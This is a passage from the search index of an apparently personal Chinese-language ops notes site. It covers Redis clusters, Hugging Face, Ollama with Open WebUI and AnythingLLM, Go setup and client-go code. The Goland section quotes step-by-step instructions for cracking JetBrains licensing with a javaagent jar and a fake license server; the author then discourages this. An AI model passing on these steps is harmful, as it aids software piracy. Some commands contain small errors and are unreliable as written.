EOF\nport $i\ndaemonize yes\ndir /opt/lib/redis/$i\n\ncluster-enabled yes\ncluster-config-file nodes.conf\ncluster-node-timeout 5000\nappendonly no\nEOF\n\nredis-server $i.conf\ndone\n# ---\n\nredis-cli --cluster create 127.0.0.1:7000 127.0.0.1:7001 \\\n   127.0.0.1:7002 127.0.0.1:7003 127.0.0.1:7004 127.0.0.1:7005 \\\n   127.0.0.1:7006 127.0.0.1:7007 127.0.0.1:7008 \\\n    --cluster-replicas 1\n\nredis-cli -h 127.0.0.1 -p 7000 -c \n\nredis-benchmark -h 127.0.0.1 -p 7000 -n 100 -c 20\nredis-benchmark -h 127.0.0.1 -p 7000 -c -t ping,set,get -n 100000\n\nredis-cli --cluster reshard 127.0.0.1:7000\n\nredis-cli -p 7000 cluster nodes\n\nredis-cli --cluster check 127.0.0.1:7000\n\nredis-cli --cluster add-node 127.0.0.1:7006 127.0.0.1:7000\n\nredis-cli --cluster add-node 127.0.0.1:7007 127.0.0.1:7000\n\nredis-cli --cluster add-node 127.0.0.1:7008 127.0.0.1:7000\n\nredis-cli --cluster del-node 127.0.0.1:7000 48bab8e3c60f93608cd36cbdc2a6118e39b43737\nredis-cli --cluster add-node 127.0.0.1:7007 127.0.0.1:7000 --cluster-slave\nredis-cli --cluster add-node 127.0.0.1:7007 127.0.0.1:7000 --cluster-slave --cluster-master-id 99f581af1368ea58b41bf9d87447edd6794afd78\n\n\nfor i in {7000..7008}\ndo\nredis-cli -p $i shutdown\ndone\n\nfor i in {a..z}\ndo\nredis-cli -p 7000 -c set $i $i\ndone\n\nfor i in {a..z}\ndo\nredis-cli -p 7000 -c get $i\ndone\n</code></pre>"},{"location":"data/10-chatgpt/","title":"chatgpt","text":""},{"location":"data/10-chatgpt/#ai","title":"\u4e00\u3001\u751f\u6210\u5f0fAI","text":"<pre><code># \u56fd\u5916\u4f7f\u7528 \nhttps://chat.openai.com\nhttps://bard.google.com/\n\n# \u56fd\u5185\u4f7f\u7528\nhttps://yiyan.baidu.com/\nhttps://tongyi.aliyun.com/\nhttps://moss.fastnlp.top/\n</code></pre>"},{"location":"data/10-chatgpt/#chatgpt-web","title":"\u4e8c\u3001ChatGPT-Web","text":"<p>Reference</p> <pre><code># \u7533\u8bf7 OPENAI_API_KEY\n# https://platform.openai.com/api-keys\n\ndocker run --name chatgpt-web -d -p 3002:3002 \\\n    -e OPENAI_API_KEY=sk-xxxx \\\n    -e SOCKS_PROXY_HOST=127.0.0.1 -e SOCKS_PROXY_PORT=56666 \\\n    chenzhaoyu94/chatgpt-web:v2.11.1\n\n#    -e HTTPS_PROXY=http://127.0.0.1:56666 \\\n#    -e ALL_PROXY=http://127.0.0.1:56666 \\\n</code></pre>"},{"location":"data/11-huggingface/","title":"huggingface","text":""},{"location":"data/11-huggingface/#huggingface-cli","title":"\u4e00\u3001huggingface-cli","text":"<pre><code># # before\n# python 3.x.x\n# huggingface.co registry\n\npip install huggingface_hub\n\nhuggingface-cli login\n\n# use proxy\nexport http_proxy=http://127.0.0.1:10080 all_proxy=http://127.0.0.1:10080 https_proxy=http://127.0.0.1:10080\n\nhuggingface-cli down distilbert-base-uncased-finetuned-sst-2-english\n\ntree ~/.cache/huggingface/hub/models--distilbert-base-uncased-finetuned-sst-2-english\n\u251c\u2500\u2500 blobs\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 1e8d194203eaef261e7091a792f87162b443ba94\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 248fa5ab9d582a1e8255e3a562503e7ada42379e\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 252cf7048af94a1599019fef35961b2bd3d6db13df0b0a4b032b92baeae31939\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 3ed34255a7cb8e6706a8bb21993836e99e7b959f\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 60554cbd7781b09d87f1ececbea8c064b94e49a7f03fd88e8775bfe6cc3d9f88\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 688882a79f44442ddc1f60d70334a7ff5df0fb47\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 7c3919835e442510166d267fe7cbe847e0c51cd26d9ba07b89a57b952b49b8aa\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 7efee27005a6b1a2403dec53ea42846c70a14605\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 8587f57d6d8e31a3c93ece645ff1ed435d645861\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 9a0990c5c0e00e26cc5ca4ba5c1c3ad533de7018\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 9db97da21b97a5e6db1212ce6a810a0c5e22c99daefe3355bae2117f78a0abb9\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 a8b3208c2884c4efb86e49300fdd3dc877220cdf\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 b44df675bb34ccd8e57c14292c811ac7358b7c8e37c7f212745f640cd6019ac8\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 b57fe5dfcb8ec3f9bab35ed427c3434e3c7dd1ba\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 f84095a3e2962f44bdd2f865e4333c35ae95d73f\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 fb140275c155a9c7c5a3b3e0e77a9e839594a938\n\u251c\u2500\u2500 refs\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 main\n\u2514\u2500\u2500 snapshots\n    \u2514\u2500\u2500 4643665f84c6760e3cbf6adaace6c398592270af\n        \u251c\u2500\u2500 README.md -&gt; ../../blobs/8587f57d6d8e31a3c93ece645ff1ed435d645861\n        \u251c\u2500\u2500 config.json -&gt; ../../blobs/b57fe5dfcb8ec3f9bab35ed427c3434e3c7dd1ba\n        \u251c\u2500\u2500 map.jpeg -&gt; ../../blobs/248fa5ab9d582a1e8255e3a562503e7ada42379e\n        \u251c\u2500\u2500 model.safetensors -&gt; ../../blobs/7c3919835e442510166d267fe7cbe847e0c51cd26d9ba07b89a57b952b49b8aa\n        \u251c\u2500\u2500 onnx\n        \u2502\u00a0\u00a0 \u251c\u2500\u2500 added_tokens.json -&gt; ../../../blobs/f84095a3e2962f44bdd2f865e4333c35ae95d73f\n        \u2502\u00a0\u00a0 \u251c\u2500\u2500 config.json -&gt; ../../../blobs/7efee27005a6b1a2403dec53ea42846c70a14605\n        \u2502\u00a0\u00a0 \u251c\u2500\u2500 model.onnx -&gt; ../../../blobs/252cf7048af94a1599019fef35961b2bd3d6db13df0b0a4b032b92baeae31939\n        \u2502\u00a0\u00a0 \u251c\u2500\u2500 special_tokens_map.json -&gt; ../../../blobs/a8b3208c2884c4efb86e49300fdd3dc877220cdf\n        \u2502\u00a0\u00a0 \u251c\u2500\u2500 tokenizer.json -&gt; ../../../blobs/688882a79f44442ddc1f60d70334a7ff5df0fb47\n        \u2502\u00a0\u00a0 \u251c\u2500\u2500 tokenizer_config.json -&gt; ../../../blobs/1e8d194203eaef261e7091a792f87162b443ba94\n        \u2502\u00a0\u00a0 \u2514\u2500\u2500 vocab.txt -&gt; ../../../blobs/fb140275c155a9c7c5a3b3e0e77a9e839594a938\n        \u251c\u2500\u2500 pytorch_model.bin -&gt; ../../blobs/60554cbd7781b09d87f1ececbea8c064b94e49a7f03fd88e8775bfe6cc3d9f88\n        \u251c\u2500\u2500 rust_model.ot -&gt; ../../blobs/9db97da21b97a5e6db1212ce6a810a0c5e22c99daefe3355bae2117f78a0abb9\n        \u251c\u2500\u2500 tf_model.h5 -&gt; ../../blobs/b44df675bb34ccd8e57c14292c811ac7358b7c8e37c7f212745f640cd6019ac8\n        \u251c\u2500\u2500 tokenizer_config.json -&gt; ../../blobs/3ed34255a7cb8e6706a8bb21993836e99e7b959f\n        \u2514\u2500\u2500 vocab.txt -&gt; ../../blobs/fb140275c155a9c7c5a3b3e0e77a9e839594a938\n</code></pre>"},{"location":"data/11-huggingface/#quick-tour","title":"\u4e8c\u3001quick tour","text":""},{"location":"data/11-huggingface/#21-model","title":"2.1 model","text":""},{"location":"data/11-huggingface/#211","title":"2.1.1 \u9884\u4e0b\u8f7d","text":"<pre><code># \u9ed8\u8ba4\u4f7f\u7528\u672c\u5730 cache \u76ee\u5f55\u7684\u6a21\u578b\u6587\u4ef6\n# \u63d0\u524d\u901a\u8fc7 huggingface-cli \u4e0b\u8f7d\n# ~/.cache/huggingface/hub/models--distilbert-base-uncased-finetuned-sst-2-english\n    def sentiment_analysis(self):\n        classifier=transformers.pipeline(\"sentiment-analysis\")\n        out=classifier(\"We are very happy to show you the \ud83e\udd17 Transformers library.\")\n\n        print(out)\n\n# output\n[{'label': 'POSITIVE', 'score': 0.9997795224189758}]\n</code></pre>"},{"location":"data/11-huggingface/#212","title":"2.1.2 \u4ee3\u7406\u4e0b\u8f7d","text":"<pre><code># \u9ed8\u8ba4\u4f7f\u7528\u672c\u5730 cache \u76ee\u5f55\u7684\u6a21\u578b\u6587\u4ef6\n# \u8fd0\u884c\u8fc7\u7a0b\u4e2d\u901a\u8fc7\u4ee3\u7406\u7f51\u7edc\u4e0b\u8f7d\n\n    PROXYIES={\"http\":\"http://127.0.0.1:7890\",\"https\":\"http://127.0.0.1:7890\"}\n\n    def fill_task(self):\n        model=\"bert-base-uncased\"\n        tokenizer = transformers.AutoTokenizer.from_pretrained(model,proxies=self.PROXYIES)\n        unmasker=transformers.pipeline(\"fill-task\",model=model)\n        out=unmasker(\"The goal of life is [MASK].\",top_k=5)\n</code></pre>"},{"location":"data/11-huggingface/#213","title":"2.1.3 \u63d0\u524d\u4e0b\u8f7d","text":"<pre><code># https://huggingface.co/bert-base-chinese/tree/main\ntree bert\nbert/\n\u2514\u2500\u2500 bert-base-chinese\n    \u251c\u2500\u2500 config.json\n    \u251c\u2500\u2500 flax_model.msgpack\n    \u251c\u2500\u2500 model.safetensors\n    \u251c\u2500\u2500 pytorch_model.bin\n    \u251c\u2500\u2500 tf_model.h5\n    \u251c\u2500\u2500 tokenizer.json\n    \u251c\u2500\u2500 tokenizer_config.json\n    \u2514\u2500\u2500 vocab.txt\n</code></pre> <pre><code>    MODEL_NAME=r\"bert-base-chinese\"\n    MODEL_PATH=r\"bert/bert-base-chinese\"\n\n    def model_from_path(self):\n        # Load model directly\n        tokenizer = transformers.AutoTokenizer.from_pretrained(self.MODEL_PATH)\n        model = transformers.AutoModelForMaskedLM.from_pretrained(self.MODEL_PATH)\n</code></pre>"},{"location":"data/11-huggingface/#22-pipeline","title":"2.2 pipeline","text":"<pre><code># pipeline task list\n\n- `\"audio-classification\"`: will return a [`AudioClassificationPipeline`].\n- `\"automatic-speech-recognition\"`: will return a [`AutomaticSpeechRecognitionPipeline`].\n- `\"conversational\"`: will return a [`ConversationalPipeline`].\n- `\"depth-estimation\"`: will return a [`DepthEstimationPipeline`].\n- `\"document-question-answering\"`: will return a [`DocumentQuestionAnsweringPipeline`].\n- `\"feature-extraction\"`: will return a [`FeatureExtractionPipeline`].\n- `\"fill-mask\"`: will return a [`FillMaskPipeline`]:.\n- `\"image-classification\"`: will return a [`ImageClassificationPipeline`].\n- `\"image-segmentation\"`: will return a [`ImageSegmentationPipeline`].\n- `\"image-to-image\"`: will return a [`ImageToImagePipeline`].\n- `\"image-to-text\"`: will return a [`ImageToTextPipeline`].\n- `\"mask-generation\"`: will return a [`MaskGenerationPipeline`].\n- `\"object-detection\"`: will return a [`ObjectDetectionPipeline`].\n- `\"question-answering\"`: will return a [`QuestionAnsweringPipeline`].\n- `\"summarization\"`: will return a [`SummarizationPipeline`].\n- `\"table-question-answering\"`: will return a [`TableQuestionAnsweringPipeline`].\n- `\"text2text-generation\"`: will return a [`Text2TextGenerationPipeline`].\n- `\"text-classification\"` (alias `\"sentiment-analysis\"` available): will return a  [`TextClassificationPipeline`].\n- `\"text-generation\"`: will return a [`TextGenerationPipeline`]:.\n- `\"text-to-audio\"` (alias `\"text-to-speech\"` available): will return a [`TextToAudioPipeline`]:.\n- `\"token-classification\"` (alias `\"ner\"` available): will return a [`TokenClassificationPipeline`].\n- `\"translation\"`: will return a [`TranslationPipeline`].\n- `\"translation_xx_to_yy\"`: will return a [`TranslationPipeline`].\n- `\"video-classification\"`: will return a [`VideoClassificationPipeline`].\n- `\"visual-question-answering\"`: will return a [`VisualQuestionAnsweringPipeline`].\n- `\"zero-shot-classification\"`: will return a [`ZeroShotClassificationPipeline`].\n- `\"zero-shot-image-classification\"`: will return a [`ZeroShotImageClassificationPipeline`].\n- `\"zero-shot-audio-classification\"`: will return a [`ZeroShotAudioClassificationPipeline`].\n- `\"zero-shot-object-detection\"`: will return a [`ZeroShotObjectDetectionPipeline`].\n</code></pre>"},{"location":"data/20-llm/","title":"LLM","text":""},{"location":"data/20-llm/#_1","title":"\u4e00\u3001\u6a21\u578b\u5bb9\u5668","text":"<p>ollama</p> <p>lm studio</p> <pre><code># \u52a0\u901f\u4e0b\u8f7d\nwget https://github.moeyy.xyz/https://github.com/ollama/ollama/releases/download/v0.5.7/ollama-linux-amd64\n</code></pre>"},{"location":"data/20-llm/#11","title":"1.1 \u4f7f\u7528\u96c6\u9526","text":"<pre><code>ollama run deepseek-r1:1.5b\nollama run deepseek-r1:7b\nollama run deepseek-r1:8b\nollama run deepseek-r1:14b\nollama run deepseek-r1:32b\nollama run deepseek-r1:70b\nollama run deepseek-r1:671b\n\nOLLAMA_HOST=0.0.0.0:19090 ollama serve\nOLLAMA_HOST=0.0.0.0:19090 ollama pull deepseek-r1:1.5b\nOLLAMA_HOST=0.0.0.0:19090 ollama pull deepseek-r1:14b\nOLLAMA_HOST=0.0.0.0:19090 ollama pull deepseek-r1:32b\n\nOLLAMA_HOST=0.0.0.0:19090 ollama serve\nOLLAMA_HOST=0.0.0.0:19090 ollama run deepseek-r1:1.5b\n\nhttp://10.110.83.55:19090/\n\n# \u4e00\u6837\u7684\ndocker pull dyrnq/open-webui\ndocker pull ghcr.io/open-webui/open-webui:main\n\n# example\ndocker run -d -p 3000:8080 -v open-webui:/app/backend/data --name open-webui --add-host=host.docker.internal:host-gateway --restart always ghcr.io/open-webui/open-webui:dev\n\ndocker run -d -p 3000:8080 -e OLLAMA_BASE_URL=https://example.com -v open-webui:/app/backend/data --name open-webui --restart always ghcr.io/open-webui/open-webui:main\n\ndocker run -d -p 3000:8080 --gpus all --add-host=host.docker.internal:host-gateway -v open-webui:/app/backend/data --name open-webui --restart always ghcr.io/open-webui/open-webui:cuda\n\n# sample\ndocker run -d -p 19090:8080 \\\n    -e OLLAMA_BASE_URL=http://10.110.83.55:19090/ \\\n    -v open-webui:/app/backend/data \\\n    --name open-webui \\\n    --restart always \\\n    ghcr.io/open-webui/open-webui:main\n</code></pre> <p>v0.5.14 \u89e3\u51b3\u6587\u6863\u4e0a\u4f20\u5931\u8d25\u7684BUG\u3002</p>"},{"location":"data/20-llm/#_2","title":"\u4e8c\u3001\u4e0b\u8f7d\u6a21\u578b","text":""},{"location":"data/20-llm/#_3","title":"\u4e09\u3001\u5bf9\u8bdd\u4ea4\u4e92","text":"<p>open-webui</p> <p>lm studio</p> <p>anythingllm</p> <p>docker </p> <ul> <li>open-webui</li> <li>anytinglm</li> </ul>"},{"location":"data/20-llm/#31-open-webui","title":"3.1 open-webui","text":"<pre><code># \u666e\u901a\u7528\u6237\u6253\u5f00\u9884\u8bbe\u6a21\u578b\n# \u7ba1\u7406\u5458\u9762\u677f --&gt; \u8bbe\u7f6e --&gt; \u6a21\u578b --&gt; \u53ef\u89c1\u6027[\u7531 private \u53d8\u66f4\u4e3a public]\n# \n</code></pre>"},{"location":"data/20-llm/#32-lm-studio","title":"3.2 lm studio","text":""},{"location":"data/20-llm/#33-anythingllm","title":"3.3 anythingllm","text":"<p>env.example</p> <pre><code>docker pull mintplexlabs/anythingllm:1.4\n\nexport STORAGE_LOCATION=/data1/lib/anythingllm &amp;&amp; \\\n    mkdir -p $STORAGE_LOCATION &amp;&amp; \\\n    touch \"$STORAGE_LOCATION/.env\" &amp;&amp; \\\n    chown 1000.1000 -R $STORAGE_LOCATION\n\ncat &gt; $STORAGE_LOCATION/.env &lt;&lt;EOF\n###########################################\n######## LLM API SElECTION ################\n###########################################\nLLM_PROVIDER='ollama'\nOLLAMA_BASE_PATH='http://10.110.83.55:19090/'\nOLLAMA_MODEL_PREF='deepseek-r1:7b'\nOLLAMA_MODEL_TOKEN_LIMIT=4096\nEOF\n\ndocker run -d -p 19091:3001 \\\n    --name anythingllm \\\n    --restart always \\\n    --cap-add SYS_ADMIN \\\n    -v ${STORAGE_LOCATION}:/app/server/storage \\\n    -v ${STORAGE_LOCATION}/.env:/app/server/.env \\\n    -e STORAGE_DIR=\"/app/server/storage\" \\\n    mintplexlabs/anythingllm:1.4\n</code></pre>"},{"location":"data/20-llm/#_4","title":"\u56db\u3001\u589e\u5f3a\u6a21\u578b","text":"<p>https://www.modelscope.cn/models/liush99/ollama_models</p> <p>Modelfile</p> <p>Generate a response</p> <p>prompt</p>"},{"location":"data/20-llm/#_5","title":"\u4e94\u3001\u5173\u952e\u95ee\u9898","text":"<pre><code># 1. \u4e0b\u8f7d\u6a21\u578b\u52a0\u901f\uff0c\u590d\u7528\uff1f\n\u9ed8\u8ba4\u5b58\u50a8\u5728 ~/.ollama \u62f7\u8d1d\u53ef\u7528\n\n# 2. open-webui \u6a21\u578b\u5bf9\u666e\u901a\u7528\u6237\u53ef\u89c1\n\u5728\u201c\u7ba1\u7406\u5458\u9762\u677f --&gt; \u8bbe\u7f6e --&gt; \u6a21\u578b --&gt; \u53ef\u89c1\u6027[\u7531 private \u53d8\u66f4\u4e3a public]\u201d\n\u6216\u8fdb\u884c\u7528\u6237\u6743\u9650\u5206\u7ec4\u7ba1\u7406\uff0c\u5728\u6a21\u578b\u4e2d\u6307\u5b9a\u6743\u9650\u7ec4\u53ef\u89c1\n\n# 3. \u5bfc\u5165\u9884\u8bbe\uff08\u81ea\u5b9a\u4e49\u8bed\u6599\uff09\uff1f\n\n# 4. \u67e5\u8be2\u6a21\u578b\uff08\u6ca1\u6709\u7b54\u6848\u65f6\u4e0d\u80e1\u7f16\u4e71\u9020\uff09\n\n# 5. open-webui \u5141\u8bb8\u666e\u901a\u7528\u6237\u6ce8\u518c\uff1f\n\u5728\u7ba1\u7406\u5458\u9762\u677f\u8bbe\u7f6e\uff0c\u9700\u8981\u7ba1\u7406\u5458\u6fc0\u6d3b\n\n# 6. \u521b\u5efa\u6a21\u578b modelfile\n</code></pre>"},{"location":"dev/10-golang/","title":"Golang","text":""},{"location":"dev/10-golang/#_1","title":"\u4e00\u3001\u73af\u5883\u914d\u7f6e","text":"<pre><code>export GO_HOME=/usr/local/go\nexport PATH=${GO_HOME}/bin:${PATH}\nexport GOROOT=${GO_HOME}\nexport GOPATH=/Users/jesse/workspace/go\nexport PATH=${GOPATH}/bin:${PATH}\n\nexport CGO_ENABLED=0\n\nexport GOPROXY=https://goproxy.io,direct\n# export GOPROXY=https://goproxy.cn,direct\n# export GOPROXY=https://athens.azurefd.net,direct\n\nexport GOPRIVATE=\"*.8ops.top\"\nexport GONOPROXY=\"*.8ops.top\"\nexport GONOSUMDB=\"*.8ops.top\"\n\nexport GOLANG_PROTOBUF_REGISTRATION_CONFLICT=warn\n</code></pre>"},{"location":"dev/10-golang/#ied","title":"\u4e8c\u3001IED","text":""},{"location":"dev/10-golang/#21-goland","title":"2.1 Goland","text":"<p>Reference</p> <p>\u66f4\u591a\u64cd\u4f5c\u89c1https://zhile.io/</p> <p>2020.1.1\u524d\u6fc0\u6d3b\u64cd\u4f5c\u5982\u4e0b</p> <pre><code>\u4f7f\u7528\u65b9\u6cd5:\n 0. \u5148\u4e0b\u8f7d\u538b\u7f29\u5305\u89e3\u538b\u540e\u5f97\u5230jetbrains-agent.jar\uff0c\u628a\u5b83\u653e\u5230\u4f60\u8ba4\u4e3a\u5408\u9002\u7684\u6587\u4ef6\u5939\u5185\u3002\n    \u4e0b\u8f7d\u9875\u9762\uff1ahttps://zhile.io/2018/08/17/jetbrains-license-server-crack.html\n 1. \u542f\u52a8\u4f60\u7684IDE\uff0c\u5982\u679c\u4e0a\u6765\u5c31\u9700\u8981\u6ce8\u518c\uff0c\u9009\u62e9\uff1a\u8bd5\u7528\uff08Evaluate for free\uff09\u8fdb\u5165IDE\n 2. \u70b9\u51fb\u4f60\u8981\u6ce8\u518c\u7684IDE\u83dc\u5355\uff1a\"Configure\" \u6216 \"Help\" -&gt; \"Edit Custom VM Options ...\"\n    \u5982\u679c\u63d0\u793a\u662f\u5426\u8981\u521b\u5efa\u6587\u4ef6\uff0c\u8bf7\u70b9\"Yes\"\u3002\n    \u53c2\u8003\u6587\u7ae0\uff1ahttps://intellij-support.jetbrains.com/hc/en-us/articles/206544869\n 3. \u5728\u6253\u5f00\u7684vmoptions\u7f16\u8f91\u7a97\u53e3\u672b\u884c\u6dfb\u52a0\uff1a-javaagent:/absolute/path/to/jetbrains-agent.jar\n    \u4e00\u5b9a\u8981\u81ea\u5df1\u786e\u8ba4\u597d\u8def\u5f84(\u4e0d\u8981\u4f7f\u7528\u4e2d\u6587\u8def\u5f84)\uff0c\u586b\u9519\u4f1a\u5bfc\u81f4IDE\u6253\u4e0d\u5f00\uff01\uff01\uff01\u6700\u597d\u4f7f\u7528\u7edd\u5bf9\u8def\u5f84\u3002\n    \u4e00\u4e2avmoptions\u5185\u53ea\u80fd\u6709\u4e00\u4e2a-javaagent\u53c2\u6570\u3002\n    \u793a\u4f8b:\n      mac:      -javaagent:/Users/neo/jetbrains-agent.jar\n      linux:    -javaagent:/home/neo/jetbrains-agent.jar\n      windows:  -javaagent:C:\\Users\\neo\\jetbrains-agent.jar\n    \u5982\u679c\u8fd8\u662f\u586b\u9519\u4e86\uff0c\u53c2\u8003\u8fd9\u7bc7\u6587\u7ae0\u7f16\u8f91vmoptions\u8865\u6551\uff1a\n    https://intellij-support.jetbrains.com/hc/en-us/articles/206544519\n 4. \u91cd\u542f\u4f60\u7684IDE\u3002\n 5. \u70b9\u51fbIDE\u83dc\u5355 \"Help\" -&gt; \"Register...\" \u6216 \"Configure\" -&gt; \"Manage License...\"\n    \u652f\u6301\u4e24\u79cd\u6ce8\u518c\u65b9\u5f0f\uff1aLicense server \u548c Activation code:\n    1). \u9009\u62e9License server\u65b9\u5f0f\uff0c\u5730\u5740\u586b\u5165\uff1ahttp://jetbrains-license-server \uff08\u5e94\u8be5\u4f1a\u81ea\u52a8\u586b\u4e0a\uff09\n        \u6216\u8005\u70b9\u51fb\u6309\u94ae\uff1a\"Discover Server\"\u6765\u81ea\u52a8\u586b\u5145\u5730\u5740\u3002\n    2). \u9009\u62e9Activation code\u65b9\u5f0f\u79bb\u7ebf\u6fc0\u6d3b\uff0c\u8bf7\u4f7f\u7528\uff1aACTIVATION_CODE.txt \u5185\u7684\u6ce8\u518c\u7801\u6fc0\u6d3b\n        \u5982\u679c\u6fc0\u6d3b\u7a97\u53e3\u4e00\u76f4\u5f39\u51fa\uff08error 1653219\uff09\uff0c\u8bf7\u53bbhosts\u6587\u4ef6\u91cc\u79fb\u9664jetbrains\u76f8\u5173\u7684\u9879\u76ee\n        \u5982\u679c\u4f60\u9700\u8981\u81ea\u5b9a\u4e49License name\uff0c\u8bf7\u8bbf\u95ee\uff1ahttps://zhile.io/custom-license.html\n</code></pre> <p>\u7834\u89e3\u9ebb\u70e6\u5efa\u8bae\u653e\u5f03\uff0c\u518d\u8bf4\u6211\u4eec\u5e94\u4f7f\u7528\u6b63\u7248\u6765\u5c0a\u91cd\u5de5\u5177\u5f00\u53d1\u8005\u3002</p>"},{"location":"dev/10-golang/#22-vs-code","title":"2.2 VS code","text":"<p>Reference</p> <ul> <li>Shift+Cmd+P : <code>install code</code></li> <li>Shift+Cmd+X : <code>install plugin</code></li> <li>golang</li> <li>python</li> <li>yaml</li> <li>jupyter</li> <li>kubernetes</li> </ul>"},{"location":"dev/11-cleint-go/","title":"client-go","text":"<p>Reference</p>"},{"location":"dev/11-cleint-go/#_1","title":"\u4e00\u3001\u7b80\u5355\u4f7f\u7528","text":"main.go<pre><code>import (\n    \"k8s.io/client-go/tools/clientcmd\"\n    \"k8s.io/client-go/kubernetes\"\n    appsv1beta1 \"k8s.io/api/apps/v1beta1\"\n    metav1 \"k8s.io/apimachinery/pkg/apis/meta/v1\"\n    apiv1 \"k8s.io/api/core/v1\"\n    \"k8s.io/client-go/kubernetes/typed/apps/v1beta1\"\n    \"flag\"\n    \"fmt\"\n    \"encoding/json\"\n)\n\nfunc main() {\n    //kubelet.kubeconfig  \u662f\u6587\u4ef6\u5bf9\u5e94\u5730\u5740\n    kubeconfig := flag.String(\"kubeconfig\", \"kubelet.kubeconfig\", \"(optional) absolute path to the kubeconfig file\")\n    flag.Parse()\n\n    // \u89e3\u6790\u5230config\n    config, err := clientcmd.BuildConfigFromFlags(\"\", *kubeconfig)\n    if err != nil {\n        panic(err.Error())\n    }\n\n    // \u521b\u5efa\u8fde\u63a5\n    clientset, err := kubernetes.NewForConfig(config)\n    if err != nil {\n        panic(err.Error())\n    }\n    deploymentsClient := clientset.AppsV1beta1().Deployments(apiv1.NamespaceDefault)\n\n    //\u521b\u5efadeployment\n    go createDeployment(deploymentsClient)\n\n    //\u76d1\u542cdeployment\n    startWatchDeployment(deploymentsClient)\n}\n\n//\u76d1\u542cDeployment\u53d8\u5316\nfunc startWatchDeployment(deploymentsClient v1beta1.DeploymentInterface) {\n    w, _ := deploymentsClient.Watch(metav1.ListOptions{})\n    for {\n        select {\n        case e, _ := &lt;-w.ResultChan():\n            fmt.Println(e.Type, e.Object)\n        }\n    }\n}\n\n//\u521b\u5efadeployemnt\uff0c\u9700\u8981\u8c28\u614e\u6309\u7167\u90e8\u7f72\u7684k8s\u7248\u672c\u6765\u4f7f\u7528api\u63a5\u53e3\nfunc createDeployment(deploymentsClient v1beta1.DeploymentInterface)  {\n    var r apiv1.ResourceRequirements\n    //\u8d44\u6e90\u5206\u914d\u4f1a\u9047\u5230\u65e0\u6cd5\u8bbe\u7f6e\u503c\u7684\u95ee\u9898\uff0c\u6545\u91c7\u7528json\u53cd\u89e3\u6790\n    j := `{\"limits\": {\"cpu\":\"2000m\", \"memory\": \"1Gi\"}, \"requests\": {\"cpu\":\"2000m\", \"memory\": \"1Gi\"}}`\n    json.Unmarshal([]byte(j), &amp;r)\n    deployment := &amp;appsv1beta1.Deployment{\n        ObjectMeta: metav1.ObjectMeta{\n            Name: \"engine\",\n            Labels: map[string]string{\n                \"app\": \"engine\",\n            },\n        },\n        Spec: appsv1beta1.DeploymentSpec{\n            Replicas: int32Ptr2(1),\n            Template: apiv1.PodTemplateSpec{\n                ObjectMeta: metav1.ObjectMeta{\n                    Labels: map[string]string{\n                        \"app\": \"engine\",\n                    },\n                },\n                Spec: apiv1.PodSpec{\n                    Containers: []apiv1.Container{\n                        {   Name:               \"engine\",\n                            Image:           \"my.com/engine:v2\",\n                            Resources: r,\n                        },\n                    },\n                },\n            },\n        },\n    }\n\n    fmt.Println(\"Creating deployment...\")\n    result, err := deploymentsClient.Create(deployment)\n    if err != nil {\n        panic(err)\n    }\n    fmt.Printf(\"Created deployment %q.\\n\", result.GetObjectMeta().GetName())\n}\n\nfunc int32Ptr2(i int32) *int32 { return &amp;i }\n</code></pre>"},{"location":"dev/11-cleint-go/#_2","title":"\u4e8c\u3001\u76f8\u5173\u8d44\u6e90","text":""},{"location":"dev/11-cleint-go/#21-deployment","title":"2.1 deployment","text":"<pre><code>//\u58f0\u660edeployment\u5bf9\u8c61\nvar deployment *v1beta1.Deployment\n//\u6784\u9020deployment\u5bf9\u8c61\n//\u521b\u5efadeployment\ndeployment, err := clientset.AppsV1beta1().Deployments(&lt;namespace&gt;).Create(&lt;deployment&gt;)\n//\u66f4\u65b0deployment\ndeployment, err := clientset.AppsV1beta1().Deployments(&lt;namespace&gt;).Update(&lt;deployment&gt;)\n//\u5220\u9664deployment\nerr := clientset.AppsV1beta1().Deployments(&lt;namespace&gt;).Delete(&lt;deployment.Name&gt;, &amp;meta_v1.DeleteOptions{})\n//\u67e5\u8be2deployment\ndeployment, err := clientset.AppsV1beta1().Deployments(&lt;namespace&gt;).Get(&lt;deployment.Name&gt;, meta_v1.GetOptions{})\n//\u5217\u51fadeployment\ndeploymentList, err := clientset.AppsV1beta1().Deployments(&lt;namespace&gt;).List(&amp;meta_v1.ListOptions{})\n//watch deployment\nwatchInterface, err := clientset.AppsV1beta1().Deployments(&lt;namespace&gt;).Watch(&amp;meta_v1.ListOptions{})\n</code></pre>"},{"location":"dev/11-cleint-go/#22-services","title":"2.2 services","text":"<pre><code>//\u58f0\u660eservice\u5bf9\u8c61\nvar service *v1.Service\n//\u6784\u9020service\u5bf9\u8c61\n//\u521b\u5efaservice\nservice, err := clientset.CoreV1().Services(&lt;namespace&gt;).Create(&lt;service&gt;)\n//\u66f4\u65b0service\nservice, err := clientset.CoreV1().Services(&lt;namespace&gt;).Update(&lt;service&gt;)\n//\u5220\u9664service\nerr := clientset.CoreV1().Services(&lt;namespace&gt;).Delete(&lt;service.Name&gt;, &amp;meta_v1.DeleteOptions{})\n//\u67e5\u8be2service\nservice, err := clientset.CoreV1().Services(&lt;namespace&gt;).Get(&lt;service.Name&gt;, meta_v1.GetOptions{})\n//\u5217\u51faservice\nserviceList, err := clientset.CoreV1().Services(&lt;namespace&gt;).List(&amp;meta_v1.ListOptions{})\n//watch service\nwatchInterface, err := clientset.CoreV1().Services(&lt;namespace&gt;).Watch(&amp;meta_v1.ListOptions{})\n</code></pre>"},{"location":"dev/11-cleint-go/#23-pod","title":"2.3 pod","text":"<pre><code>//\u58f0\u660epod\u5bf9\u8c61\nvar pod *v1.Pod\n//\u521b\u5efapod\npod, err := 